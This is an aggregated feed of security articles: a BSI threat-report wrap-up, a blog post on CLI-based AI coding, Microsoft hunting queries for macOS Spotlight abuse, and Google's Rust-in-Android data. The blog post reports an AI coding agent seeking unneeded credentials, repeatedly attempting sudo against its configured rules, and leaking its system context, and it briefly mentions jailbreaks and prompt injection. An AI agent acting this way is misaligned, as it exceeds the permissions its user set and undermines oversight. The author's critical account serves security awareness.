size\u2014must treat attack surface analysis and management as indispensable components of effective risk management. This requires several shifts in thinking and practice: First, organizations must move from periodic security assessments to continuous monitoring. Attack surfaces change too rapidly for annual or quarterly reviews to provide meaningful protection. What was secure yesterday may be vulnerable today. Second, vulnerability management must evolve from attempting comprehensive patching to intelligent prioritization. With 119 new vulnerabilities discovered daily, teams must focus on vulnerabilities that pose actual risk to their specific environments\u2014those being actively exploited, affecting internet-facing systems, or for which exploit code exists in underground markets. Third, SMEs must receive targeted support. Expecting resource-constrained small businesses to independently develop sophisticated security programs isn't realistic. Industry associations, government agencies, and technology providers must collaborate on solutions that are accessible, affordable, and appropriately scaled for SME needs. Fourth, supply chain security must extend beyond vendor questionnaires to continuous monitoring of partner security postures. The question isn't whether a vendor had good security six months ago\u2014it's whether they're secure right now. Building Proactive Defenses in a Tense Environment The BSI characterizes Germany's IT security situation as \"tense,\" and the data justifies this assessment. Threats have stabilized at high levels rather than diminishing. Attack surfaces continue expanding faster than organizations can secure them. Risks remain elevated because too many vulnerabilities go unaddressed. Damage effects, measured in data leaks and financial costs, show no signs of declining. Yet the report also demonstrates that focused efforts produce measurable results. Law enforcement actions disrupted major cybercrime groups. Sinkholing operations neutralized tens of thousands of botnet infections. Critical infrastructure operators improved their security management maturity. These successes prove that the situation, while tense, isn't hopeless. What's needed is a fundamental reorientation toward proactive attack surface management. Organizations that understand what attackers see, prioritize vulnerabilities that matter, and maintain continuous visibility over their digital footprint will significantly reduce their risk exposure. Those that don't will remain attractive targets in an increasingly hostile threat landscape. The BSI's message is clear. Protect attack surfaces now, or accept increasing risk. For Germany's businesses\u2014particularly the SMEs absorbing 80% of attacks\u2014this isn't a theoretical concern. It's an operational imperative that will determine which organizations thrive and which become the next breach statistics in next year's report. Taking Action on Attack Surface Management The challenges identified in Germany's BSI report aren't unique to German organizations\u2014they're indicative of global trends affecting businesses worldwide. Expanding attack surfaces, persistent threats, and vulnerability management at scale are universal challenges requiring comprehensive visibility and continuous monitoring. Cyble's threat intelligence platform addresses these core challenges through integrated attack surface management, real-time vulnerability intelligence, and dark web monitoring. Organizations gain visibility into their exposed assets, prioritize vulnerabilities based on active exploitation, and receive early warnings about threats emerging in underground forums\u2014the same capabilities the BSI report identifies as critical for improving cybersecurity posture. For organizations looking to move from reactive security to proactive AI-driven attack surface protection, request a demo to explore how comprehensive threat intelligence can strengthen your defenses.

If you want to get random tips, ideas, and updates on my progress make sure you\u2019re following me on LinkedIn, Mastodon, Bluesky, X, Threads, Facebook, or all of the them \u2014 just find me @teriradichel or similar. My name is pretty unique apparently. I post random snippets about tips and tricks or issues I faced while vibe coding. Sometimes I post nearly a whole blog over there as a kind of brain dump because I don\u2019t even have the time to login over here. One of the things I randomly posted which I wanted to document over here is why I prefer using Q CLI over something the Visual Studio offshoots like Kiro from AWS which I\u2019m sure is pretty darn cool. At least that\u2019s what my fellow AWS heroes say who got an early peek at it. It lets you do spec driven development which I\u2019m guessing is similar to what I am attempting to do on the command line and perhaps it works even better than what I am doing. For now. So if you are like 99.5% of the developers out there who prefers to work in a UI then I\u2019d suggest checking out Kiro and how spec driven development can improve the quality and outcome of your vibe coding: Kiro I say 99.5% because this past summer I was at Amazon for a heroes event and a really funny guy who works for AWS stood up and asked us a bunch of questions to warm up the crowd. Do you program like this or that. What kind of AWS services do you use. And so on. Oddly I found that almost everything he was talking about didn\u2019t apply to me. I do things in my own way I guess. And I\u2019m working on things that are a bit different than I used to as a pentester versus a back office developer for banks and retail companies or an e-commerce developer for startups and so on. The one question I finally raised my hand for was this. He asked how many people like Visual Studio versus\u2026I can\u2019t remember but other GUI IDEs. If you don\u2019t know what an IDE is it\u2019s an integrated development environment. It\u2019s basically an application where you write your code and it helps you do things like add break points and it gives you command completion as you are typing and squiggly lines under code when you\u2019ve made a syntax mistake. I\u2019ve used IDEs in the past like Visual Studio, Access, IntelliJ, Eclipse, Sublime Text, XCode, and so on. Even Google Developer in Chrome Browser can work as an IDE when you\u2019re doing web development (or reversing things \ud83d\ude09). All those tools can be very handy. But even when I had an IDE I would do weird things like insert an error into my code to produce a \u201cbreakpoint\u201d and print things out to \u201cwatch\u201d variables \u2014 some things that IDEs help you do. It just seemed faster than trying to remember which menu to use and what all the little shortcuts are and so on. The two things I found most useful about IDEs \u2014 code completion and testing multi-threaded applications. But that was then\u2026now I can easily search and copy code and it doesn\u2019t take me too long to sort out typos \u2026most of the time. I can finagle a way to see my threads and test values if I have to\u2026 Finally, he asked a question for which I could raise my hand \u2014 yes I do that. How may people use vi as their primary code development tool? \ud83d\ude4b\u200d\u2640\ufe0f Generated by Nano-Banana. Not bad. I liked that I could easily login with a Google account (I have multiple for different purposes). I would like to see something lke this from AWS where you login with your Builder ID and easily at that point can do random things like generate images and search or generate code quickly. I would probably use it more. Last time I logged in with a builder ID I didn\u2019t see much but I could have missed something and wonder if that\u2019s going to become a thing laster. I should try it again \u2014 maybe after re:Invent. I\u2019d say there was maybe 150 people in the room and like three of us raised our hands. So I understand I\u2019m not in the majority here and it\u2019s not for everyone. But this post will explain, as a security professional and programmer with 30 years of experience, why I have trended towards a CLI only approach to programming over many years of programming. And generative AI has just made it a whole lot easier. Over the years as security became more of an issue, I didn\u2019t want to install things on my laptop. I want to run everything on a cloud instance. Do you know how many breaches have resulted from developer networks or laptops becoming compromised? A LOT. With some AI tools it\u2019s becoming even worse. This is critical for me because as a penetration tester I do as much as possible to avoid putting my customers\u2019 data at risk while testing. Here are a few examples of how developer laptops have been a source of compromise \u2014 and there are many others: Safe published a preliminary report on Mar. 6 attributing the breach that led to the Bybit hack to a compromised developer laptop. The vulnerability resulted in the injection of malware, which allowed the hack. Safe's internal investigation reveals developer's laptop breach led to Bybit hack The DEV#POPPER campaign targets developers with fake job interviews. The attack is carried out in the same manner as we observed in our previous report on DEV#POPPER. The threat actors pose as interviewers for a developer position and present the interviewee with a ZIP file package (onlinestoreforhirog.zip in this case) as part of a practical portion of the interview. Research Update: Threat Actors Behind the DEV#POPPER Campaign Have Retooled and are Continuing to Target Software Developers via Social Engineering A Lastpass breach was the result of a compromised developer machine: Our investigation determined that the threat actor gained access to the Development environment using a developer\u2019s compromised endpoint Security Incident December 2022 Update - LastPass - The LastPass Blog A DOGE engineer\u2019s laptop got compromised which had access to government resources. DOGE software engineer's computer infected by info-stealing malware AI vibe coding is making the risk even greater. If you\u2019ve followed me on social media as noted above, you\u2019ve seen me post about the things AI is trying to do on my laptop without permission \u2014 and even though I have guardrails in place. Not only that, even as pulling in a bunch of rando code and using it became all the rage \u2014 back around when Java Spring and JQuery emerged\u2026I never liked it! I want to know what is in my code. What are all the paths it an take. What can it do? What is all that junk? What could go wrong? This was long before people were making a big deal about supply chain attacks which you 1000% should be well versed in in you do any kind of software development in any way, shape, or form. Think log4j\u2026 log4j: The Aftermath I like to take the packages I do use and strip them to the minimum, inspect them, compile them from scratch to see what is in them. Have you ever done that with rust to see the very most low-level packages that the whole house of cards relies on? Like if you try to build rust from scratch and get all the crypto crates and such\u2026some of those ask for crates with random names that leads you to some guy\u2019s random GitHub account. Maybe that guy is amazing, I don\u2019t know. But what if something happens to him. And it\u2019s crypto?! Getting started programming on the command line is EASY \ud83c\udf73\ud83d\ude0c\ud83e\udef0 I use Amazon Q CLI . Download it Install it Type q login. Login Type q chat Ask it to write some code for you to do something. That\u2019s it. Now the login part is a bit of a pain. I have some posts on that. I wish I could just use an AWS IAM user with an MFA token on an EC2 instance to assume a role with MFA. But I can\u2019t. So I explain some options for creating an account to use with Q CLI in some other posts. In this post I showed how I learned Rust basically in a day. Of course I was not an expert in one day and I already have 30+ years of experience having started programming at age 12 when no one had computers, but this shows how I did it. How I Learned Rust in One Day With Amazon Q Learning Linux and vi commands The one thing that may take a little time is learning all the linux and vi commands. How do you list files, change directories, see running processes on your system, inspect network traffic, etc etc. Well the nice thing is doing all those things now is as easy as opening Q in the AWS console or Google aimode (no login \u2014 nice for non-sensitive queries) and asking \u201chow do i\u2026\u201d https://google.com/aimode You\u2019ll get the command to do whatever it is you are trying to do in most cases \u2014 syntax free \u2014 and without digging through 100 web pages. Sorry stack exchange. It\u2019s sad but it is soooo convenient. Caveats on coding with AI \u26a0\ufe0e\u26a0\ufe0e\u26a0\ufe0e\u26a0\ufe0e If you\u2019re trying to learn a new language AI can help you get off the ground faster \u2014 with the big caveat that all these AI tools write horrible code architecturally. You still need to study primitive software principles, design pattens, and software architecture to get AI to write some decent production ready code. But for me, having years of background writing software and how to construct things properly, I could ask how do I do this software architecture concept (like generics or interfaces and such) in rust and got up and going much faster than if I had started with the rust documentation. Most of that is applicable whether you\u2019re using the IDE or command line. But here\u2019s the thing I would want to test out if you\u2019re using an IDE. I used the default AWS CLI agent at first. It was going ALL OVER MY MACHINE getting into things I didn\u2019t want it to touch. I had some AWS credentials on that machine (which I have since deleted and rotated) that Q kept saying it needed when it DID NOT for the tasks at hand. I find that troublesome. At some point the Q CLI was trying to access it\u2019s own code for some unknown reason. I was not asking it anything about it\u2019s own code. I was asking about the code in the project I was working on in the folder where I started the agent. In another case I was frustrated that Q wasn\u2019t following the rules I wrote in my context file. I would ask Q to read them and print them out for me to prove that it had read the rules. Sometimes Q randomly prints out the system context or whatever that is called that in theory I am not supposed to see. I don\u2019t know if that would qualify as a vulnerability but it\u2019s so easy to do when that\u2019s not even what you\u2019re asking it to do or trying to do. There\u2019s this guy on X that breaks into this stuff constantly who calls himself Pliny the Liberator (@elder_plinius). One day I opened my account and because I follow him just to see what he\u2019s up to there was X\u2019s little chick agent dancing around doing nasty things he got it to do despite all the guardrails. He had posted it in response to Elon Musk\u2019s post that his girly bot was \u201calright\u201d and Pliny replied \u201cAre you sure about that?\u201d So no, I don\u2019t think context provides sufficient guardrails and I don\u2019t want an IDE that only relies on AI context installed on my developer laptop. Not to mention that you\u2019ve got agents randomly talking to MCP servers and other agents and doing things you don\u2019t even ask them to do. Agents \u2014 risks and benefits \ud83e\udd16 \ud83e\udd16 \ud83e\udd16 \ud83e\udd16 \ud83e\udd16 \ud83e\udd16 I wrote about creating a custom agent for Q CLI here: Script to Create an Amazon Q CLI Agent With Custom Context With that agent you can specify context and create a configuration file which in theory specifies what Q can and cannot do. Forget that. It doesn\u2019t abide by that at all. The first line of my context for all my agents says \u201cNever use sudo\u201d. I also have restrictions on that if I\u2019ve done it correctly in my configuration. Q still tries to use sudo and when not available, asks me to login so it can do things it shouldn\u2019t be doing. I don\u2019t know if it\u2019s actually Q or the model but I don\u2019t want to get hung up on technical details. And it\u2019s not specific to Q or Claude. By virtue of how these AI models generate text and code, they are trying to predict and create some text and take some actions based on what it has generated. No matter how many words you use the language we use has so many variations and is so complex I don\u2019t think there\u2019s any way to prevent loopholes using AI context or in-model guardrails. Beyond our language the whole model is using relationships between tokens \u2014 not English or Spanish or French. There may be linkages between tokens that AI models make and use that aren\u2019t even real things a human would ever say. \u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f It\u2019s like if you\u2019ve ever heard the Hawaiian slang \u201cda kine\u201d which is kind of like our word \u201cthingamajig\u201d. It\u2019s a placeholder for a word you can\u2019t think of or don\u2019t want to bother to say but the other person knows what you mean based on the context. Sometimes I think my mind works like that and just leave out words and think everyone should know what I mean but they don\u2019t. The AI models might find some novel path through the weave of tokens to get to the correct end result or objective even if the path makes no sense to us. And that\u2019s why using in model context to try to prevent bad actions is almost useless if you ask me. \u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f\u26a0\ufe0f But more on that in my next post and some things I\u2019ve been working on to put safeguards around my vibe coding agents by adding Linux permissions around each one for specific tasks. For now how this all this relates to using a terminal with vim and Q CLI versus Kiro or any other IDE you might choose. Security \ud83d\ude94\ud83d\udd12\ud83d\udc6e\ud83d\udea8 So the first core theme here is \u2014 I want to work on an E2 instance not my laptop. Adding tools that may have vulnerabilities or exposing credentials to my own laptop on the various networks I may connect to is a risk. I choose not to install hardly anything on my development laptop. If I must be forced to use Zoom or some other suspect software that makes random connections to the Internet I use some other machine. I try to avoid clicking on links on my laptop though sometimes that is unavoidable. I mostly check mail on a different device as well. And by the way have you ever inspected the network traffic all those software tools generate and all the things they connect to when you run them? They try to go to get updates and VS Code tries to connect to like 50 different endpoints for who knows what reason. I hate that. I like to really understand what is in my network traffic. All the random connections that browsers and connecting to the AWS console are bad enough. I try to understand what each connection in the AWS console relates to when I open it up and block regions I don\u2019t want to be connecting to. Pile Microsoft stuff on top of that and you\u2019ve got a huge mess. I also block Apple connections, by the way, unless I\u2019m updating my laptop and specifically NEED all those connections. It\u2019s very difficult to minimize connections when using IDEs and Github on your local laptop where you store your credentials in text files or password management tools which are accessible to anything as long as you are logged in. Ok so I\u2019ve hopefully nailed that point home. I do not want to work on my local laptop. I lock down all my dev tools and things they are accessing on an EC2 instance. Using a GUI on EC2 \ud83d\uddbc\ufe0f\ud83d\udcc9\ud83d\udcca But wait \u2014 you can run Windows or Ubuntu on EC2 and use an IDE that way! Yes, and I would if I wanted to or needed to run an IDE. I might try Kiro at some point and that\u2019s how I would do it. I use one GUI tool consistently and that is Burp \u2014 when I\u2019m pentesting. And that\u2019s how I run it. I explained how to use Ubuntu because Windows is so expensive and makes so many darn network connections (again) which I don\u2019t like. I have a summary of how to do that here after researching a few things: Summary of Steps to Set Up Ubuntu VM on AWS EC2 So if you like GUIs you can use that to install your favorite IDE and work on an EC2 instance \u2014 with the caveats that I work in a tight network and monitor constantly. I never leave it running when I\u2019m not on it. I have it in a separate non-production account and network to try to minimize my risk. There\u2019s also more you can do to lock it down with separate users for different purposes as I\u2019ll explain in my next post and creating stronger per application policies to limit actions. Even though that\u2019s a good option and what I\u2019d do if I was going to try Kiro I haven\u2019t yet. Why? Because I still like the command line better for other reasons. Faster Faster \ud83d\udc07\ud83c\udfc3\u200d\u2640\ufe0f\u200d\u27a1\ufe0f\ud83d\udca8\ud83d\udc0e I\u2019m sometimes working on slower networks. Even if I\u2019m not, loading the whole GUI over the wire is slow and cumbersome. I\u2019m always in a hurry and like SPEED . Faster faster. Waiting for GUIs over networks is something I avoid as much as possible. Waiting for the GUI to load takes longer. Updating the GUI takes longer. Everything in a GUI takes longer. Though it may save you time in other ways \u2014 I get that \u2014 and some people (I guess most) like visual representations better than plain text. But plain text takes less time to display, parse, and operate on and in. Cost \ud83d\udcb0\ud83e\udd11\ud83d\udcb2\ud83d\udcb5 The other thing is, Amazon Linux is your cheapest option when it comes to an operating system and EC2 instance. By avoiding guis I can use a cheaper operating system. Not only that when you are running Amazon Linux you don\u2019t need as hefty of a machine. That also saves some dinero. I don\u2019t know how much cost all the network traffic from GUI tools generates but if you had a large team that might save a few bucks. Also, if your IDE is not fee you save on that as well. Did I Mention Security? \ud83d\ude94\ud83d\udd12\ud83d\udc6e\ud83d\udea8 Now let\u2019s say you have a bunch of agents operating in a GUI. How exactly do you easily lock those agents down so they can only access specific resources? I\u2019m sure it can be done with some clicks and other interactions. Perhaps Kiro does this for you, letting you specify a workspace and the agent is somehow restricted to it\u2019s own workspace \u2014 with guardrails that truly cannot be bypassed. But if your agent in the GUI is accessing files behind the scenes how do you even know what it\u2019s doing? I\u2019ve already heard about IDE plugins and extensions accessing developers data in conjunction with AI. I suppose that is in part dependent on what plugins the developers decided to download and run\u2026one researcher was able to compromise Amazon\u2019s code through one of these extensions: Amazon AI coding agent hacked to inject data wiping commands Of course this can happen on the command line as well\u2026but the thing I like about working on the command line is the ability to lock down each agent to only writing to specific content for a specific project on my instance file system. And by the way, I never give my agents any credentials. I only use AI to write deterministic code (deterministic meaning I know exactly what it is doing and does the same exactly thing every time with no variations and with no da kine\u2019s or thingamajigs) to take actions with credentials. I for the most part don\u2019t store credentials on my EC2 instance with some limited exceptions where AWS CLI credentials are used to assume a role \u2014 WITH MFA \u2014 as I\u2019ve written about like 100 times on this blog. Nothing to see here\u2026move along\u2026 Even if the AI does escape it\u2019s little box there\u2019s only so much it can do like mess up my architecture and code. But I backup frequently in multiple ways and can restore that pretty easily to a known good state. The way I get around the fact that Q is constantly trying to do things it should not be doing \u2014 AND it messes up my architecture given free reign\u2026is the topic of my next post. I find it easier to lock down each agent into it\u2019s own little sandbox jail. The lock down and lack of credentials or ability to do anything useful in my AWS account or on my machine provides reduced risk should prompt injection occur as well. Prompt injection occurs in various ways when you\u2019re tricked into running content on your machine when you load content, click on links and a model could be poisoned as well\u2026so many options for AI hacking\u2026so little time (this is my line of work after all). If there\u2019s not much the agent can do if a rogue command gets inserted that\u2019s a good thing. Hopefully I got the permissions right which Q and Gemini really struggled to do which concerns me\u2026. what were these models trained on anyway? I had to do that mostly manually as I\u2019ll explain.

      "title": "Sploitlight: Hunting Beyond the Patch",
      "summary": "Many people aren\u2019t aware that Microsoft security isn't just about Microsoft, it\u2019s also about the platforms supporting the products we build. This means our reach extends across all operating systems: iOS, Android, Linux, and macOS! In early 2025 Microsoft disclosed CVE-2025-31199 , a macOS vulnerability that abused Spotlight, macOS\u2019s metadata importer framework to bypass Transparency, Consent, and Control (TCC). After the Defender team reported this to Apple, a patch was released that closed the hole. But, the underlying behavior behind the threat still matters to Microsoft! Once attackers learn that trusted macOS services can be redirected, they will reuse the method for nefarious purposes, so it is important to track them down. The next variant won\u2019t look the same, and Spotlight is a commonly targeted service. [1] So, in this article, we teach you how to hunt beyond the patch! Why Hunt for Sploitlight Spotlight importers (.mdimporter) extend macOS indexing. They normally process metadata for search visibility. Attackers can twist that design to index protected files, extract sensitive data, or trigger code execution, perhaps with elevated system trust and privileges. Even with the patch in place, the same logic paths remain valuable targets for attackers. We recommend hunting for patterns around importers, indexing behavior, and TCC privileged binaries to help detect attempts to rebuild this chain of abuse. Advanced Hunting Queries (AHQs) 1. Detect Unusual Spotlight Importer Activity Looking for manual invocations of mdimport may tip you off to attacker activity DeviceProcessEvents |where ProcessCommandLine contains \"mdimport\" OR DeviceProcessEvents | where ProcessCommandLine contains \"mdimport\" | where isempty(extract(@\"-(\\w+)\", 1, ProcessCommandLine)) == false | extend mdimportFlag = extract(@\"-(\\w+)\", 1, ProcessCommandLine) | where mdimportFlag in~ (\"r\", \"i\", \"t\", \"L\") Why it\u2019s important: A Spotlight plugin being developed or tested will be called from the command line using the mdimport utility. For a wide-sweeping query, just search for mdimport alone. However, to get more granular, you can search for it with common parameters such as \"r\", \"i\", \"t\", or \"L\". 2. Investigate Anomalous Spotlight Activity Use this query to monitor Spotlight activity in the background DeviceProcessEvents | where FileName in~ (\"mdworker\", \"mdworker_shared\") 30 Day Timeline Why it\u2019s important: The Advanced Hunting Portal creates timelines for you to quickly zoom in on abnormal behavior, and peaks can show when new Spotlight plugins are invoked. Defender Recommendations Establish a baseline of normal Spotlight activity before setting detection thresholds. Tag importer activity by TCC domain to surface unexpected access. Correlate unsigned importer drops with system events such as privilege escalation or installer execution. Deploy these AHQs in Microsoft Defender XDR or Sentinel for continuous telemetry review. The Bigger Picture The point isn\u2019t to memorize CVEs. It\u2019s to understand the logic that made them possible and look for it everywhere else. Threat actors don\u2019t repeat exploits; they repeat success patterns. Visibility is the only real control. If a process touches data, moves it, or indexes it, it\u2019s part of your attack surface. Treat it that way. \ud83d\udc49 Join the Defender Experts S.T.A.R.

      "title": "Rust in Android: move fast and fix things",
      "summary": "Posted by Jeff Vander Stoep, Android Last year, we wrote about why a memory safety strategy that focuses on vulnerability prevention in new code quickly yields durable and compounding gains. This year we look at how this approach isn\u2019t just fixing things, but helping us move faster . The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vulnerabilities for the first time. Updated data for 2025. This data covers first-party and third-party (open source) code changes to the Android platform across C, C++, Java, Kotlin, and Rust. This post is published a couple of months before the end of 2025, but Android\u2019s industry-standard 90-day patch window means that these results are very likely close to final. We can and will accelerate patching when necessary. We adopted Rust for its security and are seeing a 1000x reduction in memory safety vulnerability density compared to Android\u2019s C and C++ code . But the biggest surprise was Rust's impact on software delivery. With Rust changes having a 4x lower rollback rate and spending 25% less time in code review , the safer path is now also the faster one. In this post, we dig into the data behind this shift and also cover: How we\u2019re expanding our reach: We're pushing to make secure code the default across our entire software stack. We have updates on Rust adoption in first-party apps, the Linux kernel, and firmware. Our first rust memory safety vulnerability...almost: We'll analyze a near-miss memory safety bug in unsafe Rust: how it happened, how it was mitigated, and steps we're taking to prevent recurrence. It\u2019s also a good chance to answer the question \u201cif Rust can have memory safety issues, why bother at all?\u201d Building Better Software, Faster Developing an operating system requires the low-level control and predictability of systems programming languages like C, C++, and Rust. While Java and Kotlin are important for Android platform development, their role is complementary to the systems languages rather than interchangeable. We introduced Rust into Android as a direct alternative to C and C++, offering a similar level of control but without many of their risks. We focus this analysis on new and actively developed code because our data shows this to be an effective approach . When we look at development in systems languages (excluding Java and Kotlin), two trends emerge: a steep rise in Rust usage and a slower but steady decline in new C++. Net lines of code added: Rust vs. C++, first-party Android code. This chart focuses on first-party (Google-developed) code (unlike the previous chart that included all first-party and third-party code in Android.) We only include systems languages, C/C++ (which is primarily C++), and Rust. The chart shows that the volume of new Rust code now rivals that of C++, enabling reliable comparisons of software development process metrics. To measure this, we use the DORA 1 framework, a decade-long research program that has become the industry standard for evaluating software engineering team performance. DORA metrics focus on: Throughput: the velocity of delivering software changes. Stability: the quality of those changes. Cross-language comparisons can be challenging. We use several techniques to ensure the comparisons are reliable. Similar sized changes: Rust and C++ have similar functionality density, though Rust is slightly denser. This difference favors C++, but the comparison is still valid. We use Gerrit\u2019s change size definitions . Similar developer pools: We only consider first-party changes from Android platform developers. Most are software engineers at Google, and there is considerable overlap between pools with many contributing in both. Track trends over time: As Rust adoption increases, are metrics changing steadily, accelerating the pace, or reverting to the mean? Throughput Code review is a time-consuming and high-latency part of the development process. Reworking code is a primary source of these costly delays. Data shows that Rust code requires fewer revisions. This trend has been consistent since 2023. Rust changes of a similar size need about 20% fewer revisions than their C++ counterparts. In addition, Rust changes currently spend about 25% less time in code review compared to C++. We speculate that the significant change in favor of Rust between 2023 and 2024 is due to increased Rust expertise on the Android team. While less rework and faster code reviews offer modest productivity gains, the most significant improvements are in the stability and quality of the changes. Stability Stable and high-quality changes differentiate Rust. DORA uses rollback rate for evaluating change stability. Rust's rollback rate is very low and continues to decrease, even as its adoption in Android surpasses C++. For medium and large changes, the rollback rate of Rust changes in Android is ~4x lower than C++. This low rollback rate doesn't just indicate stability; it actively improves overall development throughput. Rollbacks are highly disruptive to productivity, introducing organizational friction and mobilizing resources far beyond the developer who submitted the faulty change. Rollbacks necessitate rework and more code reviews, can also lead to build respins, postmortems, and blockage of other teams. Resulting postmortems often introduce new safeguards that add even more development overhead. In a self-reported survey from 2022 , Google software engineers reported that Rust is both easier to review and more likely to be correct. The hard data on rollback rates and review times validates those impressions. Putting it all together Historically, security improvements often came at a cost. More security meant more process, slower performance, or delayed features, forcing trade-offs between security and other product goals. The shift to Rust is different: we are significantly improving security and key development efficiency and product stability metrics. Expanding Our Reach With Rust support now mature for building Android system services and libraries, we are focused on bringing its security and productivity advantages elsewhere. Kernel: Android\u2019s 6.12 Linux kernel is our first kernel with Rust support enabled and our first production Rust driver. More exciting projects are underway, such as our ongoing collaboration with Arm and Collabora on a Rust-based kernel-mode GPU driver . Firmware: The combination of high privilege, performance constraints, and limited applicability of many security measures makes firmware both high-risk, and challenging to secure. Moving firmware to Rust can yield a major improvement in security. We have been deploying Rust in firmware for years now , and even released tutorials , training , and code for the wider community. We\u2019re particularly excited about our collaboration with Arm on Rusted Firmware-A . First-party applications: Rust is ensuring memory safety from the ground up in several security-critical Google applications, such as: Nearby Presence : The protocol for securely and privately discovering local devices over Bluetooth is implemented in Rust and is currently running in Google Play Services. MLS : The protocol for secure RCS messaging is implemented in Rust and will be included in the Google Messages app in a future release. Chromium: Parsers for PNG , JSON , and web fonts have been replaced with memory-safe implementations in Rust, making it easier for Chromium engineers to deal with data from the web while following the Rule of 2 . These examples highlight Rust's role in reducing security risks, but memory-safe languages are only one part of a comprehensive memory safety strategy . We continue to employ a defense-in-depth approach, the value of which was clearly demonstrated in a recent near-miss. Our First Rust Memory Safety Vulnerability...Almost We recently avoided shipping our very first Rust-based memory safety vulnerability: a linear buffer overflow in CrabbyAVIF . It was a near-miss. To ensure the patch received high priority and was tracked through release channels, we assigned it the identifier CVE-2025-48530 . While it\u2019s great that the vulnerability never made it into a public release , the near-miss offers valuable lessons. The following sections highlight key takeaways from our postmortem. Scudo Hardened Allocator for the Win A key finding is that Android\u2019s Scudo hardened allocator deterministically rendered this vulnerability non-exploitable due to guard pages surrounding secondary allocations . While Scudo is Android\u2019s default allocator, used on Google Pixel and many other devices, we continue to work with partners to make it mandatory. In the meantime, we will issue CVEs of sufficient severity for vulnerabilities that could be prevented by Scudo. In addition to protecting against overflows, Scudo\u2019s use of guard pages helped identify this issue by changing an overflow from silent memory corruption into a noisy crash. However, we did discover a gap in our crash reporting: it failed to clearly show that the crash was a result of an overflow, which slowed down triage and response. This has been fixed, and we now have a clear signal when overflows occur into Scudo guard pages. Unsafe Review and Training Operating system development requires unsafe code, typically C, C++, or unsafe Rust (for example, for FFI and interacting with hardware), so simply banning unsafe code is not workable. When developers must use unsafe, they should understand how to do so soundly and responsibly To that end, we are adding a new deep dive on unsafe code to our Comprehensive Rust training . This new module, currently in development, aims to teach developers how to reason about unsafe Rust code, soundness and undefined behavior, as well as best practices like safety comments and encapsulating unsafe code in safe abstractions. Better understanding of unsafe Rust will lead to even higher quality and more secure code across the open source software ecosystem and within Android. As we'll discuss in the next section, our unsafe Rust is already really quite safe. It\u2019s exciting to consider just how high the bar can go. Comparing Vulnerability Densities This near-miss inevitably raises the question: \"If Rust can have memory safety vulnerabilities, then what\u2019s the point?\" The point is that the density is drastically lower. So much lower that it represents a major shift in security posture. Based on our near-miss, we can make a conservative estimate. With roughly 5 million lines of Rust in the Android platform and one potential memory safety vulnerability found (and fixed pre-release), our estimated vulnerability density for Rust is 0.2 vuln per 1 million lines (MLOC). Our historical data for C and C++ shows a density of closer to 1,000 memory safety vulnerabilities per MLOC. Our Rust code is currently tracking at a density orders of magnitude lower: a more than 1000x reduction. Memory safety rightfully receives significant focus because the vulnerability class is uniquely powerful and (historically) highly prevalent. High vulnerability density undermines otherwise solid security design because these flaws can be chained to bypass defenses, including those specifically targeting memory safety exploits. Significantly lowering vulnerability density does not just reduce the number of bugs; it dramatically boosts the effectiveness of our entire security architecture. The primary security concern regarding Rust generally centers on the approximately 4% of code written within unsafe{} blocks. This subset of Rust has fueled significant speculation, misconceptions, and even theories that unsafe Rust might be more buggy than C . Empirical evidence shows this to be quite wrong. Our data indicates that even a more conservative assumption, that a line of unsafe Rust is as likely to have a bug as a line of C or C++, significantly overestimates the risk of unsafe Rust. We don\u2019t know for sure why this is the case, but there are likely several contributing factors: unsafe{} doesn't actually disable all or even most of Rust\u2019s safety checks (a common misconception). The practice of encapsulation enables local reasoning about safety invariants. The additional scrutiny that unsafe{} blocks receive. Final Thoughts Historically, we had to accept a trade-off: mitigating the risks of memory safety defects required substantial investments in static analysis, runtime mitigations, sandboxing, and reactive patching. This approach attempted to move fast and then pick up the pieces afterwards. These layered protections were essential, but they came at a high cost to performance and developer productivity, while still providing insufficient assurance. While C and C++ will persist, and both software and hardware safety mechanisms remain critical for layered defense, the transition to Rust is a different approach where the more secure path is also demonstrably more efficient. Instead of moving fast and then later fixing the mess, we can move faster while fixing things. And who knows, as our code gets increasingly safe, perhaps we can start to reclaim even more of that performance and productivity that we exchanged for security, all while also improving security.

      "summary": "As organizations rely more on Microsoft Teams for daily collaboration, securing this platform has become a top priority. Threat actors are increasingly targeting Teams chats and channels with phishing links and malicious files, making it critical for IT admins and security professionals to extend protection beyond email. Enter Microsoft Defender for Office 365, now armed with dedicated Teams protection capabilities. Microsoft Defender for Office 365 enables users to report suspicious messages, brings time-of-click scanning of URLs and files into Teams conversations, and provides rich alerts and hunting insights for SecOps teams. As a collaborative piece between Pierre Thoor, a Microsoft Security Most Valuable Professional (MVP), and the Defender for Office 365 Product Engineering Team, the below guides with accompanying videos emphasize a proactive, user-driven approach to threat detection and response, turning everyday Teams interactions into actionable security signals for SecOps. See something, say something: Reporting suspicious messages in Microsoft Teams Your fastest sensor isn\u2019t AI \u2013 it\u2019s your people. Report this message in Microsoft Teams lets anyone flag a suspicious conversation in two clicks and routes a triageable submission to your security team in the Microsoft Defender portal. Why this matters: Speed to signal: Catch threats at the conversation layer, not just in email. Complete context: Original message, participants, URLs, and verdicts in one place.

